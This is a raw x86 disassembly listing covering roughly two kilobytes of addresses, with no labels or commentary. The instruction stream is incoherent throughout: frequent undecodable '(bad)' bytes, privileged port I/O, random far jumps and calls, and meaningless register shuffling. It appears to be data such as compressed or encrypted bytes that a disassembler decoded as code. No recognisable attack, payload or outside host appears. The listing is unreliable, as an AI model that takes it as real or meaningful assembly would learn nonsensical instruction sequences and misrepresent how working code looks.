  417d1f:	repz mov ch,0x7d
  417d22:	arpl   WORD PTR [edx],dx
  417d24:	stos   BYTE PTR es:[edi],al
  417d25:	cmp    BYTE PTR [edi],0x2d
  417d28:	adc    al,dl
  417d2a:	jae    0x417d0b
  417d2c:	popf   
  417d2d:	xchg   DWORD PTR [ecx+0x2b10cfa1],esp
  417d33:	mov    al,ds:0xede22860
  417d38:	dec    ebx
  417d39:	or     al,0xe7
  417d3b:	jno    0x417d84
  417d3d:	add    al,0x10
  417d3f:	sub    bl,bh
  417d41:	sbb    DWORD PTR [ebx+ecx*2-0x2b],0xffffffc1
  417d46:	(bad)  
  417d47:	out    0xe6,eax
  417d49:	mov    BYTE PTR ds:0x88103f07,dh
  417d4f:	mov    DWORD PTR [ebx+0x4d],ebx
  417d52:	ds cmc 
  417d54:	mov    ah,0x93
  417d56:	sbb    ebp,edx
  417d58:	imul   esi,DWORD PTR [ebx+0x5],0x28
  417d5c:	fs repz shl ebx,cl
  417d60:	mov    ah,0x4e
  417d62:	xchg   edi,eax
  417d63:	inc    edx
  417d64:	mov    cl,0xab
  417d66:	rol    al,1
  417d68:	scas   eax,DWORD PTR es:[edi]
  417d69:	aas    
  417d6a:	jp     0x417da9
  417d6c:	mov    ah,0x29
  417d6e:	pop    esp
  417d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d70:	jmp    0x1812690d
  417d75:	xchg   BYTE PTR [ebp+0xddc4abb],ch
  417d7b:	loopne 0x417d42
  417d7d:	mov    dh,0x0
  417d7f:	dec    BYTE PTR [ecx-0x7fc9ceee]
  417d85:	jecxz  0x417def
  417d87:	adc    BYTE PTR [ebp-0x36],al
  417d8a:	pop    esi
  417d8b:	and    DWORD PTR [ebp-0x3c],0x8
  417d8f:	stc    
  417d90:	out    0x3c,al
  417d92:	sub    DWORD PTR [ebx+ebp*4+0x4c],eax
  417d96:	jb     0x417dd8
  417d98:	sbb    ch,bh
  417d9a:	xchg   ebp,eax
  417d9b:	icebp  
  417d9c:	mov    ebp,DWORD PTR [ecx+0x3b71a6f0]
  417da2:	add    DWORD PTR [ebx],0x376cd7ba
  417da8:	jle    0x417dce
  417daa:	lods   al,BYTE PTR ds:[esi]
  417dab:	xchg   esp,ecx
  417dad:	xlat   BYTE PTR ds:[ebx]
  417dae:	mov    edi,0xe914b280
  417db3:	sub    ch,BYTE PTR [edi-0x1e]
  417db6:	push   ebp
  417db7:	scas   eax,DWORD PTR es:[edi]
  417db8:	push   ss
  417db9:	mov    ebx,0x264ce076
  417dbe:	mov    ah,BYTE PTR [ecx]
  417dc0:	call   0xd9e7:0x841bdf98
  417dc7:	inc    edi
  417dc8:	ds test eax,0xd57cf45f
  417dce:	aad    0x11
  417dd0:	out    0xee,al
  417dd2:	or     dh,BYTE PTR [ebp+edi*4-0x127c977]
  417dd9:	or     ecx,DWORD PTR [eax+0x6e80b222]
  417ddf:	int    0x9b
  417de1:	mov    esp,0xa96e96d0
  417de6:	mov    al,0xc6
  417de8:	mov    cl,0x5a
  417dea:	aad    0x34
  417dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ded:	jecxz  0x417e5c
  417def:	lock dec eax
  417df1:	xchg   ecx,eax
  417df2:	aad    0x5
  417df4:	sub    edx,DWORD PTR [edi*1-0xebe1e00]
  417dfb:	ret    
  417dfc:	(bad)  
  417dfd:	stc    
  417dfe:	mov    bl,0x1c
  417e00:	cmc    
  417e01:	mul    bl
  417e03:	cmp    edx,esi
  417e05:	jo     0x417e44
  417e07:	mov    edx,0x5779e9ca
  417e0c:	jp     0x417e43
  417e0e:	sar    ch,1
  417e10:	mov    al,BYTE PTR [ecx+0x74]
  417e13:	cmp    eax,0x1bff0823
  417e18:	push   ds
  417e19:	fisubr WORD PTR [edi-0xe]
  417e1c:	mov    cl,0xc3
  417e1e:	mov    edi,0x8a5a1607
  417e23:	test   al,0x23
  417e25:	push   cs
  417e26:	rol    BYTE PTR [ebx+0x57],1
  417e29:	outs   dx,BYTE PTR ds:[esi]
  417e2a:	sbb    eax,0xb4fff38d
  417e2f:	out    0xbd,al
  417e31:	adc    dh,bh
  417e33:	aad    0x26
  417e35:	sbb    edi,ebp
  417e37:	sub    ebp,DWORD PTR [ebp-0x2a]
  417e3a:	fxch   st(2)
  417e3c:	jb     0x417dc8
  417e3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e3f:	push   edx
  417e40:	sub    bl,BYTE PTR [esi-0x5]
  417e43:	ss adc eax,0xf7647be0
  417e49:	push   ebp
  417e4a:	daa    
  417e4b:	xlat   BYTE PTR ds:[ebx]
  417e4c:	leave  
  417e4d:	and    eax,0xd651d2bc
  417e53:	in     al,dx
  417e54:	or     eax,0xc1aa3252
  417e59:	mov    dl,0xea
  417e5b:	cmp    BYTE PTR [ecx],bh
  417e5d:	xor    DWORD PTR [ebx-0x35],eax
  417e60:	add    eax,0xb1859682
  417e65:	inc    ecx
  417e66:	inc    ebx
  417e67:	lea    eax,[edi+0x16]
  417e6a:	(bad)  
  417e6b:	jnp    0x417eb4
  417e6d:	call   0xfbeada8b
  417e72:	fidiv  DWORD PTR [eax+0x35]
  417e75:	cmp    eax,DWORD PTR [ecx+0x79fcaa1b]
  417e7b:	adc    ebp,DWORD PTR [ebp-0x148f113e]
  417e81:	pop    ebx
  417e82:	add    DWORD PTR [edi+edx*1-0x73],esi
  417e86:	fbstp  TBYTE PTR [ecx+0x6a]
  417e89:	jl     0x417f00
  417e8b:	stos   BYTE PTR es:[edi],al
  417e8c:	imul   ebx,DWORD PTR [ebx+0x3732ec9f],0x2b
  417e93:	retf   
  417e94:	xchg   edx,eax
  417e95:	inc    esp
  417e96:	sub    esp,DWORD PTR [ebx-0x4b]
  417e99:	test   DWORD PTR [esi],esi
  417e9b:	leave  
  417e9c:	lods   al,BYTE PTR ds:[esi]
  417e9d:	dec    ebp
  417e9e:	popw   ds
  417ea0:	pop    ds
  417ea1:	sbb    BYTE PTR [esi-0x5e392c12],bl
  417ea7:	pop    ebx
  417ea8:	mov    ah,BYTE PTR [ecx]
  417eaa:	and    eax,0x4b98c344
  417eaf:	loopne 0x417e4c
  417eb1:	arpl   di,bp
  417eb3:	jb     0x417eb4
  417eb5:	loop   0x417e54
  417eb7:	std    
  417eb8:	lahf   
  417eb9:	sub    al,0xea
  417ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ebc:	and    bh,BYTE PTR [esi-0x8]
  417ebf:	into   
  417ec0:	jnp    0x417efa
  417ec2:	gs mov ebx,0xc6cd7543
  417ec8:	out    0x3c,al
  417eca:	out    dx,al
  417ecb:	fcmovbe st,st(1)
  417ecd:	jno    0x417f1e
  417ecf:	push   0xffffff80
  417ed1:	icebp  
  417ed2:	and    BYTE PTR [edi+ebp*1+0x66cf406a],dl
  417ed9:	and    BYTE PTR [esi],dh
  417edb:	fimul  DWORD PTR [ecx-0x76]
  417ede:	ret    0x3c7c
  417ee1:	repz jmp 0x417eda
  417ee4:	or     ebp,DWORD PTR [ebp-0xb]
  417ee7:	sbb    ebx,DWORD PTR [edx-0x33]
  417eea:	jmp    0x706d8f81
  417eef:	push   esp
  417ef0:	mov    ds:0xcc5fa52c,al
  417ef5:	or     ah,BYTE PTR [edi-0x7d887358]
  417efb:	repnz popf 
  417efd:	pop    esp
  417efe:	imul   esi,DWORD PTR [edi+0x5f0cbb36],0xffffffae
  417f05:	std    
  417f06:	and    al,0x86
  417f08:	sahf   
  417f09:	mov    bh,0xc6
  417f0b:	popa   
  417f0c:	pusha  
  417f0d:	in     eax,dx
  417f0e:	scas   eax,DWORD PTR es:[edi]
  417f0f:	ja     0x417ef2
  417f11:	mov    ebp,0xe44b2968
  417f16:	fdivr  st(0),st
  417f18:	data16 mov al,0x9e
  417f1b:	jle    0x417f02
  417f1d:	jmp    0x417ef0
  417f1f:	inc    eax
  417f20:	sbb    BYTE PTR [edx-0x31],bl
  417f23:	push   edi
  417f24:	iret   
  417f25:	inc    edi
  417f26:	adc    DWORD PTR [ebx+0x9c5ed9],ebx
  417f2c:	sbb    al,0xdb
  417f2e:	scas   al,BYTE PTR es:[edi]
  417f2f:	std    
  417f30:	jecxz  0x417efd
  417f32:	mov    al,ds:0x817b083e
  417f37:	iret   
  417f38:	xchg   edx,eax
  417f39:	add    DWORD PTR [eax+0x1e],ebp
  417f3c:	and    eax,0x6abc3cc4
  417f41:	mov    dl,0xa6
  417f43:	or     BYTE PTR [ecx+0x20],bl
  417f46:	mov    DWORD PTR [eax-0x7dd4a348],esp
  417f4c:	imul   eax,DWORD PTR [ebx],0x12
  417f4f:	mov    ebx,0x271b255a
  417f54:	dec    edx
  417f55:	(bad)  
  417f56:	out    dx,eax
  417f57:	pop    eax
  417f58:	xor    al,0xc
  417f5a:	aam    0x7c
  417f5c:	mov    esi,edi
  417f5e:	lds    esp,FWORD PTR [ecx+edx*1]
  417f61:	sub    BYTE PTR gs:[eax-0x24],0x7a
  417f66:	jecxz  0x417f79
  417f68:	scas   al,BYTE PTR es:[edi]
  417f69:	jmp    0x5aef:0xb00aa2e5
  417f70:	pushf  
  417f71:	aaa    
  417f72:	mov    ebx,DWORD PTR [esi]
  417f74:	repz pop ecx
  417f76:	dec    ecx
  417f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f78:	pop    ebx
  417f79:	imul   edi,DWORD PTR [eax+0x525b001e],0x32fcf144
  417f83:	mov    ebp,0x2a97a3fe
  417f88:	push   0x6c58ad67
  417f8d:	lds    eax,FWORD PTR ds:0xe814d61c
  417f93:	push   esp
  417f94:	cld    
  417f95:	loop   0x417f77
  417f97:	push   esp
  417f98:	in     al,dx
  417f99:	dec    ecx
  417f9a:	inc    edi
  417f9b:	outs   dx,DWORD PTR ds:[esi]
  417f9c:	add    bl,BYTE PTR [ebx-0x57ebe2c6]
  417fa2:	cmp    eax,0x74414003
  417fa7:	mov    cl,0x11
  417fa9:	fisttp QWORD PTR [edi-0x15a62367]
  417faf:	aaa    
  417fb0:	fbld   TBYTE PTR [ebx]
  417fb2:	in     eax,dx
  417fb3:	fisttp QWORD PTR [esi-0x6c]
  417fb6:	push   esi
  417fb7:	jmp    0x417f48
  417fb9:	or     ch,0xf3
  417fbc:	mov    esi,0x25111132
  417fc1:	test   BYTE PTR [edx+ecx*8+0x57317da2],bl
  417fc8:	mov    BYTE PTR [esp+edx*4-0x5eea3b80],al
  417fcf:	xchg   edx,eax
  417fd0:	loopne 0x417f62
  417fd2:	mov    ch,0xc2
  417fd4:	xchg   ebx,eax
  417fd5:	not    BYTE PTR [edx-0x497d91b8]
  417fdb:	xor    dh,cl
  417fdd:	and    bh,0xaa
  417fe0:	call   DWORD PTR [ecx+0x5c]
  417fe3:	loope  0x418062
  417fe5:	push   ecx
  417fe6:	aad    0x68
  417fe8:	push   ds
  417fe9:	fwait
  417fea:	ss ja  0x417fa3
  417fed:	xor    al,0xf8
  417fef:	gs in  eax,dx
  417ff1:	pop    edi
  417ff2:	pop    ecx
  417ff3:	add    bh,BYTE PTR [ebx+edi*4-0x9]
  417ff7:	retf   
  417ff8:	xchg   ecx,eax
  417ff9:	mov    esi,0x5d4d1f81
  417ffe:	outs   dx,BYTE PTR ds:[esi]
  417fff:	(bad)
  418002:	add    eax,0x8a51a2b9
  418007:	xor    DWORD PTR [edx+0x49],eax
  41800a:	(bad)  [eax]
  41800c:	lahf   
  41800d:	adc    eax,0xf1545313
  418012:	sbb    eax,0xe87e8da4
  418017:	and    bh,BYTE PTR [ebp+0x2a5e3df1]
  41801d:	xchg   ecx,edx
  41801f:	dec    esp
  418020:	popf   
  418021:	and    eax,0xa0f20efb
  418026:	jge    0x418039
  418028:	pop    ecx
  418029:	lea    eax,[ecx-0x58]
  41802c:	jmp    0x417ff5
  41802e:	inc    ebx
  41802f:	imul   eax,DWORD PTR [edi],0xe27a445
  418035:	add    edx,DWORD PTR [ebx+0x22b18962]
  41803b:	jecxz  0x418094
  41803d:	adc    DWORD PTR [edx+0x1a83d17d],ebp
  418043:	test   eax,0xad03133c
  418048:	imul   edi,DWORD PTR [ebx],0xffffffc3
  41804b:	add    DWORD PTR [edi],edi
  41804d:	lds    esp,FWORD PTR [eax*1-0x23db9b55]
  418054:	mov    ecx,0xed8c810b
  418059:	fstp   DWORD PTR [esi+0x7a]
  41805c:	arpl   WORD PTR [edx+0x3e6e630a],bx
  418062:	loop   0x41809a
  418064:	xor    DWORD PTR [edx+edi*4],0x37
  418068:	(bad)  
  418069:	sbb    ebp,DWORD PTR [esi+0x7e0dd014]
  41806f:	push   esi
  418070:	stc    
  418071:	adc    DWORD PTR [ebx-0x41],0x41
  418075:	fnstcw WORD PTR [edx]
  418077:	cdq    
  418078:	add    ebx,DWORD PTR [eax+0x19]
  41807b:	out    0x73,al
  41807d:	jns    0x4180d1
  41807f:	add    cl,BYTE PTR [esi]
  418081:	pusha  
  418082:	push   ds
  418083:	fimul  DWORD PTR [ebx-0x353c150d]
  418089:	xchg   esp,eax
  41808a:	sbb    DWORD PTR [ebx+0x5372e74],ebp
  418090:	push   ss
  418091:	lock push eax
  418093:	inc    edi
  418094:	jg     0x41803e
  418096:	mov    ds:0x99f17b70,eax
  41809b:	sti    
  41809c:	mov    edx,0x5c42a019
  4180a1:	in     eax,0x4
  4180a3:	mov    cl,0x79
  4180a5:	add    BYTE PTR ds:0x67288706,0xe5
  4180ac:	sbb    eax,0xc85a02fc
  4180b1:	or     eax,0xb9691f3d
  4180b6:	outs   dx,DWORD PTR ds:[esi]
  4180b7:	in     al,0xce
  4180b9:	or     dl,BYTE PTR [eax-0x39]
  4180bc:	jmp    0x87d1:0x10b78166
  4180c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180c4:	clc    
  4180c5:	call   0xd1c0:0x58bd1225
  4180cc:	lock push ds
  4180ce:	cmc    
  4180cf:	jge    0x4180de
  4180d1:	pop    esp
  4180d2:	sub    BYTE PTR [edi+esi*8+0x4bf2afe7],0xd5
  4180da:	inc    edi
  4180db:	xor    al,0x81
  4180dd:	add    eax,edi
  4180df:	lahf   
  4180e0:	and    eax,0x3d3f4e23
  4180e5:	adc    DWORD PTR [ebp+0x58],edi
  4180e8:	inc    esp
  4180e9:	shl    DWORD PTR [esi+eiz*2+0x50],0x3a
  4180ee:	push   ss
  4180ef:	adc    ecx,DWORD PTR [edx-0x6d]
  4180f2:	test   BYTE PTR [ecx+0x18],0xf7
  4180f6:	ja     0x4180c7
  4180f8:	fsubr  QWORD PTR [esi]
  4180fa:	lea    ebp,[eax]
  4180fc:	dec    ebx
  4180fd:	sub    ch,BYTE PTR [ebx+0x28]
  418100:	pop    ebp
  418101:	ss push 0x39e9e783
  418107:	and    eax,0xcc6b795a
  41810c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41810d:	mov    dl,0x6a
  41810f:	push   esi
  418110:	xchg   DWORD PTR [edi+esi*4-0x2cfde223],edx
  418117:	xor    al,0x8d
  418119:	aad    0xea
  41811b:	mov    ch,bl
  41811d:	ss mov edi,0xca072c64
  418123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418124:	sub    DWORD PTR [esp+eiz*2],ecx
  418127:	scas   al,BYTE PTR es:[edi]
  418128:	mov    ds:0x54dad977,al
  41812d:	cdq    
  41812e:	and    ax,0x3faf
  418132:	test   BYTE PTR [eax],cl
  418134:	cmp    cl,BYTE PTR [eax]
  418136:	sbb    al,0xe
  418138:	mov    edx,0x3f57fd86
  41813d:	loopne 0x4180db
  41813f:	out    dx,eax
  418140:	loope  0x4181a9
  418142:	lods   eax,DWORD PTR ds:[esi]
  418143:	js     0x418118
  418145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418146:	jb     0x4180e4
  418148:	in     eax,0x93
  41814a:	add    edi,DWORD PTR [edx]
  41814c:	push   ds
  41814d:	push   ss
  41814e:	xchg   DWORD PTR [edx+0x6fef769e],ebp
  418154:	aad    0xbe
  418156:	sbb    BYTE PTR [ebx+0x1],cl
  418159:	int    0x43
  41815b:	pop    ecx
  41815c:	push   ecx
  41815d:	out    0x8b,eax
  41815f:	fldz   
  418161:	sbb    ebp,0xc76ce719
  418167:	mov    cl,0x7e
  418169:	ja     0x4181a9
  41816b:	mov    ecx,0x1c76e780
  418170:	push   cs
  418171:	push   ebp
  418172:	dec    eax
  418173:	push   edi
  418174:	xor    al,0x92
  418176:	mov    al,0x7a
  418178:	jo     0x4181cd
  41817a:	leave  
  41817b:	dec    ecx
  41817c:	sbb    bh,BYTE PTR [ebx]
  41817e:	mov    DWORD PTR [edx+0x27],esi
  418181:	jle    0x418127
  418183:	jne    0x418120
  418185:	mov    ebx,0x86091086
  41818a:	shl    DWORD PTR [eax+0x79],0xf9
  41818e:	cmp    al,0x0
  418190:	retf   0x474b
  418193:	mov    DWORD PTR [edi+0x5632f301],ecx
  418199:	sbb    eax,0x570cd92d
  41819e:	into   
  41819f:	mov    esi,0xead6f34a
  4181a4:	add    eax,0xd95bc0f9
  4181a9:	mov    edx,0xf1139e28
  4181ae:	jbe    0x418211
  4181b0:	lea    esp,[ebx]
  4181b2:	mov    cl,0x31
  4181b4:	test   BYTE PTR [ecx+esi*2+0x172b3bd0],0x84
  4181bc:	rcl    ah,cl
  4181be:	pushf  
  4181bf:	fisttp QWORD PTR [eax+0xbec70d2]
  4181c5:	fadd   QWORD PTR ds:0x12ec9654
  4181cb:	call   0x2e8b:0x54563bf6
  4181d2:	loopne 0x418225
  4181d4:	or     dl,BYTE PTR [ecx]
  4181d6:	lea    eax,[edx+0x3b34aeee]
  4181dc:	sub    al,0x48
  4181de:	adc    esp,esp
  4181e0:	rol    DWORD PTR [ebp+0x78b6c669],1
  4181e6:	push   es
  4181e7:	jns    0x41821d
  4181e9:	jae    0x418198
  4181eb:	ror    BYTE PTR [edx+edx*4-0x30c27640],cl
  4181f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f3:	jp     0x4181f8
  4181f5:	scas   eax,DWORD PTR es:[edi]
  4181f6:	ret    0xb8d8
  4181f9:	xor    al,dh
  4181fb:	jmp    0x2e67de89
  418200:	iret   
  418201:	repz push es
  418203:	les    esp,FWORD PTR [ebx+0x10]
  418206:	xchg   ebx,eax
  418207:	aaa    
  418208:	xor    al,0xa4
  41820a:	not    esi
  41820c:	and    dh,ch
  41820e:	lahf   
  41820f:	mov    ebx,0x8e543db2
  418214:	sub    al,0x31
  418216:	inc    esp
  418217:	aad    0x7c
  418219:	dec    ecx
  41821a:	sbb    dl,BYTE PTR [edi]
  41821c:	push   esp
  41821d:	push   0xffffffc4
  41821f:	ret    0x68e0
  418222:	push   es
  418223:	or     BYTE PTR ds:0x2d3cff5c,bl
  418229:	sti    
  41822a:	dec    ecx
  41822b:	outs   dx,DWORD PTR ds:[esi]
  41822c:	in     eax,dx
  41822d:	inc    ecx
  41822e:	hlt    
  41822f:	pop    es
  418230:	sti    
  418231:	or     dl,BYTE PTR [esi]
  418233:	inc    ebp
  418234:	lock mov ds:0x6babc865,al
  41823a:	inc    esp
  41823b:	adc    al,0xbe
  41823d:	aam    0x85
  41823f:	mov    dh,0x35
  418241:	xchg   edi,eax
  418242:	sub    WORD PTR [ebx-0x17005c95],cx
  418249:	pop    ecx
  41824a:	(bad)  
  41824c:	pop    ebx
  41824d:	add    DWORD PTR [ebx+edx*4-0x55],esi
  418251:	dec    eax
  418252:	daa    
  418253:	es inc eax
  418255:	test   al,0x22
  418257:	scas   al,BYTE PTR es:[edi]
  418258:	dec    eax
  418259:	dec    BYTE PTR [ebx+0x6bf410a]
  41825f:	and    ch,BYTE PTR [esi+0x49]
  418262:	rcr    BYTE PTR [ecx],0x18
  418265:	inc    edx
  418266:	ins    BYTE PTR es:[edi],dx
  418267:	and    dl,dl
  418269:	mov    ?,WORD PTR [ebx-0x1f]
  41826c:	not    DWORD PTR [edi-0x2ffa8eb8]
  418272:	stc    
  418273:	mov    bh,0xe5
  418275:	shr    DWORD PTR [ebx-0x1077ccc2],1
  41827b:	xor    DWORD PTR [esi-0x50b43c1b],0xffffff95
  418282:	call   0xf8bd:0x923b3bab
  418289:	sub    ebx,DWORD PTR [edx-0x4609251a]
  41828f:	out    0xcb,eax
  418291:	sti    
  418292:	shl    BYTE PTR [esi],0xba
  418295:	das    
  418296:	les    ecx,FWORD PTR [ebp+0x33564e3a]
  41829c:	loope  0x4182ae
  41829e:	ja     0x4182c5
  4182a0:	cli    
  4182a1:	ins    DWORD PTR es:[edi],dx
  4182a2:	fldcw  WORD PTR [edi+0x5b]
  4182a5:	mov    al,0xd4
  4182a7:	mov    cl,0x98
  4182a9:	cld    
  4182aa:	cmp    edi,DWORD PTR [ebx+ebx*1]
  4182ad:	pusha  
  4182ae:	popa   
  4182af:	push   ebx
  4182b0:	mov    edx,0x2bfb4351
  4182b5:	push   esp
  4182b6:	sbb    dh,ch
  4182b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182b9:	fwait
  4182ba:	dec    edi
  4182bb:	test   al,0x9e
  4182bd:	pop    ecx
  4182be:	icebp  
  4182bf:	mov    ?,WORD PTR ds:0x65fe0e2a
  4182c5:	adc    eax,0x3b8e2fed
  4182ca:	and    ah,bl
  4182cc:	jnp    0x41826b
  4182ce:	adc    ch,cl
  4182d0:	ja     0x418332
  4182d2:	(bad)  
  4182d3:	pop    ecx
  4182d4:	in     al,0xf9
  4182d6:	cmp    ebx,DWORD PTR [ebx-0x2e]
  4182d9:	push   esp
  4182da:	adc    DWORD PTR [ebx],ebx
  4182dc:	cmc    
  4182dd:	xchg   DWORD PTR [ecx+0x64],esp
  4182e0:	pop    ss
  4182e1:	ja     0x418295
  4182e3:	mov    eax,ss
  4182e5:	sub    edx,esp
  4182e7:	rcl    BYTE PTR [ebx],0x3a
  4182ea:	popf   
  4182eb:	jne    0x41832b
  4182ed:	rol    DWORD PTR [edx+0x1a],0xe4
  4182f1:	pop    ebp
  4182f2:	mov    ds,ebx
  4182f4:	(bad)  
  4182f5:	stos   DWORD PTR es:[edi],eax
  4182f6:	call   0x81fca88c
  4182fb:	sti    
  4182fc:	xlat   BYTE PTR ds:[ebx]
  4182fd:	mov    dh,0xa2
  4182ff:	pop    ebx
  418300:	(bad)  
  418301:	aaa    
  418302:	dec    eax
  418303:	je     0x41835f
  418305:	xor    ebx,DWORD PTR [ebx+0x4f]
  418308:	repz ret 0x8b53
  41830c:	clc    
  41830d:	mov    al,0xb4
  41830f:	xchg   DWORD PTR [eax+0x78850479],esi
  418315:	cmp    BYTE PTR [esi],ch
  418317:	pop    ebx
  418318:	mov    ecx,0x74e110c
  41831d:	sub    ebx,ebx
  41831f:	pusha  
  418320:	(bad)  
  418321:	in     al,0x6f
  418323:	mov    ah,0x8b
  418325:	jl     0x418352
  418327:	mov    edi,0xa8c26930
  41832c:	retf   
  41832d:	shr    DWORD PTR [edi],cl
  41832f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418330:	inc    eax
  418331:	jnp    0x4182ea
  418333:	sbb    edi,edx
  418335:	jmp    0x349e:0xe4afea9f
  41833c:	dec    eax
  41833d:	(bad)  
  41833e:	jmp    0x2531:0x1190bfb2
  418345:	pushf  
  418346:	xchg   edx,eax
  418347:	imul   esi,DWORD PTR ds:0xe763cc69,0xfffffff4
  41834e:	sbb    bl,BYTE PTR [ecx+edi*2]
  418351:	sbb    edx,0x2b
  418354:	jmp    0xd27e:0x112f8789
  41835b:	xor    BYTE PTR [eax],al
  41835d:	fld    QWORD PTR [esi+0x1e959b33]
  418363:	in     eax,0x2f
  418365:	mov    al,0x20
  418367:	ret    0xc676
  41836a:	cld    
  41836b:	leave  
  41836c:	or     edi,DWORD PTR [ecx]
  41836e:	outs   dx,BYTE PTR ds:[esi]
  41836f:	and    al,0xa8
  418371:	and    ah,BYTE PTR [edi-0x28]
  418374:	push   ss
  418375:	xor    eax,0x4422a2eb
  41837a:	pop    ebp
  41837b:	xlat   BYTE PTR ds:[ebx]
  41837c:	adc    BYTE PTR [edx],ah
  41837e:	and    DWORD PTR [ecx],ebx
  418380:	push   esp
  418381:	mov    eax,ds:0xad69a68d
  418386:	daa    
  418387:	dec    edx
  418388:	fisttp DWORD PTR [edi]
  41838a:	and    DWORD PTR [ebp-0xa6d01c9],0xbddbbe78
  418394:	and    al,0xd3
  418396:	aas    
  418397:	lea    esi,[ebx-0x5452ad0a]
  41839d:	xchg   ecx,eax
  41839e:	stos   DWORD PTR es:[edi],eax
  41839f:	dec    esi
  4183a0:	mov    dh,0x74
  4183a2:	pop    ds
  4183a3:	mov    eax,ds:0x4e8b0165
  4183a8:	pop    ebx
  4183a9:	cmp    al,0xd8
  4183ab:	mov    esp,0x81da4f3e
  4183b0:	outs   dx,BYTE PTR ds:[esi]
  4183b1:	mov    ds:0x43ea63ca,eax
  4183b6:	mulps  xmm6,XMMWORD PTR [eax-0x62]
  4183ba:	or     bh,bh
  4183bc:	pop    ebx
  4183bd:	arpl   WORD PTR [ebx],ax
  4183bf:	add    eax,0x2abb67a
  4183c4:	mov    DWORD PTR [edx],esi
  4183c6:	and    al,0x45
  4183c8:	hlt    
  4183c9:	cmp    eax,0xa2ebef68
  4183ce:	fidivr WORD PTR [eax+0x51fa2c85]
  4183d4:	rol    BYTE PTR [ecx-0x6e],cl
  4183d7:	or     eax,0x9d54bcc6
  4183dc:	jecxz  0x4183bf
  4183de:	push   ss
  4183df:	or     BYTE PTR [eax-0x161f0bb4],0x8e
  4183e6:	xor    BYTE PTR [ebx],0x26
  4183e9:	sub    eax,0x5e7aa0cb
  4183ee:	mov    dl,0xd
  4183f0:	push   esp
  4183f1:	(bad)  
  4183f3:	fisubr WORD PTR [ebx]
  4183f5:	aas    
  4183f6:	mov    ds:0x9129e9fb,eax
  4183fb:	jge    0x418446
  4183fd:	push   esp
  4183fe:	bound  edi,QWORD PTR [ebp-0x6609877f]
  418404:	(bad)  
  418405:	fild   DWORD PTR [ebp+0x1411ffda]
  41840b:	jg     0x418466
  41840d:	jmp    0xed21cf5d
  418412:	pop    es
  418413:	in     eax,0x52
  418415:	mov    ecx,0x7aa2295d
  41841a:	std    
  41841b:	std    
  41841c:	and    ah,ch
  41841e:	out    dx,eax
  41841f:	pop    esp
  418420:	mov    ecx,DWORD PTR [eax-0x408bc5c7]
  418426:	mov    ecx,0xfe19558d
  41842b:	out    dx,eax
  41842c:	add    BYTE PTR [edx+edi*8-0x3b7866ac],dl
  418433:	cmp    eax,edi
  418435:	fcom   DWORD PTR [edx+esi*1-0x79d6cfbb]
  41843c:	aam    0xc2
  41843e:	pop    ebx
  41843f:	mov    WORD PTR [ecx+0x2562e2a6],es
  418445:	sbb    DWORD PTR [edi-0x78],esi
  418448:	mov    al,ds:0xb002a90b
  41844d:	pop    ecx
  41844e:	jmp    0x78b20b2f
  418453:	mov    ch,BYTE PTR [edi+edi*1-0x39]
  418457:	lahf   
  418458:	pop    esp
  418459:	fld    QWORD PTR ds:0xc024aa6b
  41845f:	push   ebx
  418460:	mov    ebx,0xcf15dcf2
  418465:	enter  0x37a4,0xbd
  418469:	cmp    ebx,DWORD PTR [esi]
  41846b:	mov    esp,0x62ef4eec
  418470:	add    dl,BYTE PTR [edx-0x53ca0049]
  418476:	mov    ebx,0x41f7f270
  41847b:	pop    edx
  41847c:	pop    ss
  41847d:	or     eax,0x189a3c23
  418482:	iret   
  418483:	loop   0x418498
  418485:	(bad)  
  418486:	enter  0x532b,0x52
  41848a:	jl     0x418421
  41848c:	lock cmc 
  41848e:	in     al,0x97
  418490:	scas   eax,DWORD PTR es:[edi]
  418491:	xchg   esp,eax
  418492:	add    eax,0x64c3436b
  418497:	and    BYTE PTR [edx+edx*4+0x2d],bl
  41849b:	sbb    BYTE PTR [edx+eax*2],bh
  41849e:	adc    ecx,ebp
  4184a0:	mov    edx,0x839b4691
  4184a5:	dec    ecx
  4184a6:	mov    edx,0x1ed5b61a
  4184ab:	loop   0x418522
  4184ad:	fst    QWORD PTR [eax+ebp*8]
  4184b0:	retf   0xdbdc
  4184b3:	fadd   DWORD PTR [ecx-0x58]
  4184b6:	out    0xbd,al
  4184b8:	fdiv   st,st(2)
  4184ba:	popf   
  4184bb:	int3   
  4184bc:	outs   dx,DWORD PTR ds:[esi]
  4184bd:	retf   0x4ae7
  4184c0:	not    BYTE PTR [edx-0x62277105]
  4184c6:	out    dx,al
  4184c7:	ss clc 
  4184c9:	cmp    DWORD PTR [edi+0x29],esi
  4184cc:	stos   BYTE PTR es:[edi],al
  4184cd:	pop    ds
  4184ce:	mov    ds:0xd4c29ea3,al
  4184d3:	xor    bh,ch
  4184d5:	dec    edi
  4184d6:	mov    cl,0xf3
  4184d8:	inc    edx
  4184d9:	pop    ebx
  4184da:	jne    0x41848e
  4184dc:	jo     0x418522
  4184de:	mov    ebp,0x25bf7500
  4184e3:	xchg   ebx,eax
  4184e4:	mov    ebx,0xd430f1eb
  4184e9:	or     al,0x49
  4184eb:	jmp    0xf05859f9
  4184f0:	push   esp
  4184f1:	push   ebx
  4184f2:	pushf  
  4184f3:	adc    eax,0x9ddf5a7c
  4184f8:	mov    esp,0xf7a4a473
  4184fd:	call   0x2332:0xe246ca13
  418504:	mov    bl,0x2
  418506:	fstp   TBYTE PTR [edx]
  418508:	leave  
  418509:	jae    0x418524
  41850b:	pop    edx
  41850c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850d:	xor    eax,0x4ad5bba5
  418512:	xchg   ecx,eax
  418513:	or     ecx,eax
  418515:	dec    esi
  418516:	adc    BYTE PTR [edi],dh
  418518:	dec    ebx
  418519:	xchg   BYTE PTR [eax-0x2d],dh
  41851c:	daa    
